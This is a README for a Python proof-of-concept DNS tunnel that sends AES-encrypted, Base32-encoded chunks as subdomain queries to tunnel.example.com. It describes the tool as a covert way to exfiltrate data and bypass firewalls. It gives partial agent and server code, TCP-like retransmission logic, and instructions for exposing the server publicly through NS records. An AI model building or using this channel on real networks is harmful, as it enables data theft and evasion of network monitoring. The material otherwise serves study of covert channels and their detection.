# 🔒 Secure DNS Tunneling with Symmetric Encryption 🔒

A Python-based implementation of a DNS tunnel that uses **AES-256 GCM** to create a secure and covert communication channel. This project is a proof-of-concept demonstrating how to exfiltrate data securely through DNS queries with **advanced reliability features akin to TCP**.

---

## 📊 Architecture Overview

The diagram below illustrates the communication flow between the Agent and the Server.

```mermaid
sequenceDiagram
    participant Agent as 💻 Agent
    participant Server as 🛡️ DNS Server

    Agent->>Agent: 1. Read & Chunk Data
    Agent->>Agent: 2. Encrypt Chunk (AES-GCM)
    Agent->>Agent: 3. Base32 Encode
    Agent->>Server: 4. Send DNS Query<br/>(encoded_chunk.tunnel.example.com)
    Server->>Server: 5. Extract & Base32 Decode
    Server->>Server: 6. Decrypt Chunk (AES-GCM)
    alt ✅ Successful Decryption
        Server-->>Agent: 7. Send ACK<br/>(DNS Response: 1.2.expected_seq)
    else ❌ Decryption Failed
        Server-->>Agent: 8. No ACK (or error response)
    end
    Agent->>Agent: 9. Receive ACK or Timeout<br/>(Retry, Congestion Control)
```



-----

## 🌟 Core Features

  * **🔒 Secure Communication**: Data is encrypted using military-grade **AES-256 GCM**, ensuring confidentiality and integrity.
  * **🤫 Covert Channel**: Utilizes DNS queries as a hidden communication channel, perfect for bypassing restrictive firewalls.
  * **🔁 Advanced Reliability with TCP-like Congestion Control**: Implements a sophisticated acknowledgment (ACK) mechanism, sequence numbering, retransmissions, duplicate ACK handling, and a congestion control algorithm (Slow Start, Congestion Avoidance, Fast Retransmit/Recovery) to ensure reliable data delivery even in lossy networks.
  * **🛡️ Data Integrity**: Leverages AES-GCM's built-in authentication tag to verify that data has not been tampered with in transit.
  * **📦 Smart Chunking**: Automatically splits large messages or files into smaller chunks for transmission and reassembles them on the server.
  * **🔢 Sequence Numbering**: Embeds a sequence number in each chunk to guarantee correct message order and prevent replay attacks.
  * **🔄 Server State Reset**: The Agent can send a specific signal to the Server to clear its received chunks and reset its state, useful for new transmissions.
  * **TCP-based DNS**: Utilizes TCP for DNS queries and responses, which can be more reliable than UDP in certain network environments and for larger data transfers.

-----

## 🛠️ Implementation Details

### 1\. Cryptography Implementation (Crypto Module)

The `crypto_module.py` manages all encryption and decryption using the `PyCryptodome` library. It implements AES-256 in GCM mode, providing strong confidentiality along with data authentication and integrity.

  * **AES-256 GCM**: Data is encrypted using a 32-byte shared key. GCM mode ensures that the data's confidentiality is protected, and also provides an authentication tag to verify that the data has not been tampered with.

    ```python
    # From crypto_module.py
    from Crypto.Cipher import AES

    class AESCipher:
        # ... __init__ method ...
        def encrypt(self, plaintext: bytes):
            cipher = AES.new(self.key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return {'ciphertext': ciphertext, 'nonce': cipher.nonce, 'tag': tag}

        def decrypt(self, ciphertext: bytes, nonce: bytes, tag: bytes):
            cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)
    ```

      * **Explanation**: The `encrypt` method generates a unique `nonce` and an `authentication tag` along with the `ciphertext`. The `decrypt` method uses these to verify the data's integrity and then decrypts it. Any alteration to the data or tag will cause decryption to fail.

### 2\. DNS Tunneling Implementation (Agent and Server)

The core logic for sending and receiving data via DNS queries is handled in `agent.py` and `server.py`.

#### Agent (`agent.py`)

The Agent splits data into small chunks, encrypts and encodes them, and then sends them as DNS queries, managing congestion and reliability.

  * **Data Preparation**: The Agent splits the input message into chunks of `CHUNK_SIZE` (50 bytes). Each chunk is encrypted, and the resulting `nonce`, `tag`, and `ciphertext` are concatenated into a single packet.

    ```python
    # From agent.py
    CHUNK_SIZE = 50 # Max size of data per chunk in bytes

    def split_data(data: bytes, size: int):
        return [data[i:i+size] for i in range(0, len(data), size)]

    def send_chunk(seq, chunk, base): # Simplified signature for explanation
        encrypted = cipher.encrypt(chunk)
        packet = encrypted['nonce'] + encrypted['tag'] + encrypted['ciphertext']
        # ... rest of the send_chunk function ...
    ```

  * **DNS Query Formatting**: The packet (containing encrypted data, nonce, and tag) is Base32 encoded. This encoded string, along with a sequence number (`seqX`), forms a subdomain of the tunnel's `DOMAIN`.

    ```python
    # From agent.py
    DOMAIN = "tunnel.example.com"

    def build_label(seq: int, encrypted: bytes) -> str:
        encoded = base64.b32encode(encrypted).decode().strip('=')
        # Labels are split to max 63 chars each
        labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        return f"seq{seq}." + ".".join(labels) + f".{DOMAIN}"
    ```

  * **Reliable Transmission with Congestion Control**: The `main` function in `agent.py` implements a simplified TCP-like congestion control protocol. This includes:

      * **Window-based Sending**: Chunks are sent within a `cwnd` (congestion window) limit.
      * **Slow Start**: The `cwnd` doubles for each successful `base` advancement until `ssthresh` is reached.
      * **Congestion Avoidance**: `cwnd` increases linearly after `ssthresh`.
      * **Fast Retransmit/Recovery**: On detection of 3 duplicate ACKs or a timeout, `ssthresh` is adjusted, and `cwnd` is reset, potentially retransmitting the lost segment quickly.
      * **ACK Handling**: ACKs are received as `1.2.X.Y` where `X.Y` reconstructs the next expected sequence number.
      * **Retransmission Limits**: Each chunk has a maximum number of retransmits before it's considered dropped.

    <!-- end list -->

    ```python
    # From agent.py (main function - simplified)
    def main():
        # ... initial setup ...
        cwnd = 2
        ssthresh = 8
        base = 0      # Base sequence number (first unacknowledged)
        next_seq = 0  # Next sequence number to send
        in_flight = {} # Chunks sent but not yet acknowledged
        last_ack = -1
        dup_ack_count = 0
        in_fast_recovery = False
        max_retransmit_per_chunk = 5

        while base < total_chunks:
            # Send new chunks up to cwnd limit
            while next_seq < base + cwnd and next_seq < total_chunks:
                # ... send logic for new chunks ...

            # Timeout detection
            # ... checks in_flight chunks for timeouts ...

            # Process ACKs (received from send_chunk)
            ack_seq = send_chunk(base, chunks[base], base) # Simplified: Agent pulls ACK for base
            if ack_seq is not None:
                if ack_seq > base: # New ACK
                    # ... update base, cwnd (slow start / congestion avoidance) ...
                elif ack_seq == last_ack: # Duplicate ACK
                    # ... increment dup_ack_count, Fast Retransmit/Recovery logic ...
            # ... error handling, sleep ...
    ```

  * **Server Reset Signal**: The Agent sends a special `seq-1.reset.DOMAIN` query to inform the Server to clear its state for a new transmission.

    ```python
    # From agent.py
    def send_reset_signal():
        reset_label = f"seq-1.reset.{DOMAIN}"
        # ... resolver setup ...
        try:
            answers = resolver.resolve(reset_label, 'A', tcp=True) # Uses TCP for reset
            for answer in answers:
                if str(answer) == "1.2.0.0": # Specific ACK for reset
                    return True
        except Exception as e:
            # ... error handling ...
        return False
    ```

#### Server (`server.py`)

The Server runs a custom DNS resolver that intercepts queries for the tunnel domain, extracts and decrypts the data, manages received chunks, and sends back reliability-aware acknowledgments.

  * **Custom DNS Resolver (TCP)**: The Server uses `dnslib` to run a custom DNS server, listening on `127.0.0.1:5354` using **TCP**. This provides a more stable connection for the advanced reliability features.

    ```python
    # From server.py
    from dnslib.server import DNSServer, BaseResolver
    from dnslib import RR, QTYPE, A

    class DNSAgentResolver(BaseResolver):
        def resolve(self, request, handler):
            # ... resolve logic ...
            
    def start_dns_server():
        resolver = DNSAgentResolver()
        # Server now listens on TCP port 5354
        server = DNSServer(resolver, port=5354, address="127.0.0.1", tcp=True)
        server.start_thread()
        # ... server loop ...
    ```

  * **State Management and Reset Handling**: The Server maintains `expected_seq` (the next sequence number it anticipates) and `received_chunks`. It explicitly handles a `seq-1` query as a reset signal, clearing its state and sending a `1.2.0.0` ACK.

    ```python
    # From server.py (inside DNSAgentResolver.resolve method)
    # Global state variables for server, protected by Lock
    global expected_seq
    # ... seq_lock, received_chunks ...

    # Handle reset request explicitly
    if seq_num == -1: # Received a reset signal
        with seq_lock:
            received_chunks.clear()
            expected_seq = 0
            # ... print confirmation ...
        ack_ip = "1.2.0.0" # Specific ACK for reset
        reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, ttl=60, rdata=A(ack_ip)))
        return reply

    # Ignore chunks older than expected_seq to prevent processing stale data
    with seq_lock:
        if seq_num < expected_seq:
            # ... print ignored message ...
            ack_ip = f"1.2.{expected_seq // 256}.{expected_seq % 256}" # ACK with current expected_seq
            reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, ttl=60, rdata=A(ack_ip)))
            return reply
    ```

  * **Data Extraction, Decryption, and Sequence Tracking**: The Server extracts the `nonce`, `tag`, and `ciphertext` from the received DNS query. After successful decryption and integrity verification, it stores the chunk and updates `expected_seq` by advancing it past any consecutive received chunks.

    ```python
    # From server.py (inside DNSAgentResolver.resolve method)
    # ... Base32 decoding and error handling ...

    nonce = full_packet[:16]
    tag = full_packet[16:32]
    ciphertext = full_packet[32:]

    plaintext = cipher.decrypt(ciphertext, nonce, tag)

    with seq_lock: # Protects access to shared state
        if seq_num not in received_chunks:
            received_chunks[seq_num] = plaintext
            # Advance expected_seq past all contiguous received chunks
            while expected_seq in received_chunks:
                expected_seq += 1
        # ... handle duplicate chunks ...
    ```

  * **Acknowledgment with Expected Sequence**: For every valid chunk, the Server sends an A record DNS response where the IP address `1.2.X.Y` encodes the `expected_seq` (the next chunk it is waiting for). This helps the Agent track acknowledged data and manage its congestion window.

    ```python
    # From server.py (inside DNSAgentResolver.resolve method)
    # Send the ACK for the next expected sequence
    ack_ip = f"1.2.{expected_seq // 256}.{expected_seq % 256}"
    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, ttl=60, rdata=A(ack_ip)))
    ```

-----

## 🛠️ Setup and Configuration

### Prerequisites

To run the project, ensure you have the following installed:

  * 🐍 Python 3.x
  * 📦 `dnspython` library
  * 📦 `dnslib` library
  * 📦 `pycryptodome` library

You can install all dependencies with a single command:

```bash
pip install dnspython dnslib pycryptodome
```

### Project Structure

```
.
├── 📁 agent.py
├── 📁 server.py
├── 📁 crypto_module.py
└── 📄 README.md
```

### Configuration Parameters

All configuration is done via constants at the top of the respective Python files.

| Parameter      | File(s)                                    | Description                                                                                             | Default Value / Example          |
| :------------- | :----------------------------------------- | :------------------------------------------------------------------------------------------------------ | :------------------------------- |
| **`SHARED_KEY`** | `agent.py`, `server.py`, `crypto_module.py` | The **32-byte (256-bit) symmetric key**. Must be identical across all files.                            | `b"0123456789ABCDEF0123456789ABCDEF"` |
| **`DOMAIN`** | `agent.py`, `server.py`                    | The base domain for the DNS tunnel.                                                                     | `'tunnel.example.com'`           |
| **`CHUNK_SIZE`** | `agent.py`                                 | Max size (in bytes) of raw data per chunk.                                                              | `50`                             |
| **`TIMEOUT`** | `agent.py`                                 | Timeout in seconds for DNS queries and retransmission detection.                                        | `4`                              |
| **`SERVER_IP`** | `agent.py`, `server.py`                    | IP address for the DNS server to run on / connect to (e.g., `127.0.0.1` for local testing).             | `'127.0.0.1'`                    |
| **`SERVER_PORT`**| `agent.py`, `server.py`                    | Port for the DNS server. **Note: Uses TCP.** | `5354`                           |

-----

## 🚀 Usage Guide

### 1\. Launch the Server

Open a terminal and run `server.py`. The server will start listening for DNS queries on TCP port `5354`.

```bash
python server.py
```

> ```
> 🔒 DNS Tunnel Server running on 127.0.0.1:5354 for domain tunnel.example.com
> ```

### 2\. Run the Agent

In a **new terminal**, run `agent.py`. The Agent will first attempt to send a reset signal to the server, then prompt for your message.

```bash
python agent.py
```

> ```
> 🔹 Sending reset signal...
> ✅ Server reset confirmed
> Enter your message: This is a highly confidential message that will be tunneled over DNS.
> 📆 Total chunks: [number of chunks]
> 📤 Sending chunk 0
> 📤 Sending chunk 1
> ```

### 3\. Watch the Magic Happen\!

The agent will show its progress, including congestion control states, and the server will show received chunks.

**💻 Agent Output (Examples):**

> ```
> 📤 Sending chunk 0
> ✅ ACK received for seq 1
> 🚀 Slow Start → cwnd = 4
> 📤 Sending chunk 1
> 📤 Sending chunk 2
> 📤 Sending chunk 3
> ✅ ACK received for seq 4
> 🚀 Slow Start → cwnd = 8
> 🔁 Duplicate ACK for 4 (1)
> 🔁 Duplicate ACK for 4 (2)
> 🔁 Duplicate ACK for 4 (3)
> 🚀 Fast Retransmit: Resending chunk 4
> ✅ ACK received for seq 5
> ✅ Exiting Fast Recovery: cwnd = 4
> ...
> ✅ All chunks sent and acknowledged.
> ```

**🛡️ Server Output (Examples):**

> ```
> 🔄 Before reset: expected_seq=0, received_chunks={}
> 🔄 Server state reset by client.
> ✅ Stored chunk 0
> 📦 Received 0: This is a highly confidentia
> ✅ Stored chunk 1
> 📦 Received 1: l message that will be tunn
> ✅ Stored chunk 2
> 📦 Received 2: eled over DNS. And this
> ✅ Stored chunk 3
> 📦 Received 3:  is even more data to test
> 🔁 Duplicate chunk 0 ignored.
> ⏭ Ignoring chunk 1 as it is older than expected_seq=4
> ✅ Stored chunk 4
> 📦 Received 4:  the advanced features.
> ```

### 4\. View the Reconstructed Message

Stop the server (`Ctrl+C`). It will automatically reassemble and display the complete message.

> ```
> ⚠️ Shutting down...
> ✅ Reconstructed message:
>     This is a highly confidential message that will be tunneled over DNS. And this is even more data to test the advanced features.
> ✅ Received chunks: [0, 1, 2, 3, 4]
> ✅ All chunks received successfully.
> ```

-----

## ⚠️ Important Considerations

  * **🚨 Security**: The `SHARED_KEY` is hardcoded for this example. In a real-world scenario, the key **must not be hardcoded**. Use a secure key exchange mechanism (like Diffie-Hellman) or pre-share it via a secure out-of-band channel.
  * **🌐 Network**: The agent is configured for a local server (`127.0.0.1`). For use over the internet, you must run `server.py` on a public server and configure your domain's NS records to point to that server's IP address and ensure TCP port `5354` is open.
  * **🕵️‍♂️ Stealth**: While DNS tunneling can bypass simple firewalls, it is **not invisible**. Network traffic analysis and Intrusion Detection Systems (IDS) can flag the unusual DNS patterns (e.g., high-entropy subdomains, high query frequency, TCP over DNS, custom ACK IP patterns) generated by this tool.

-----
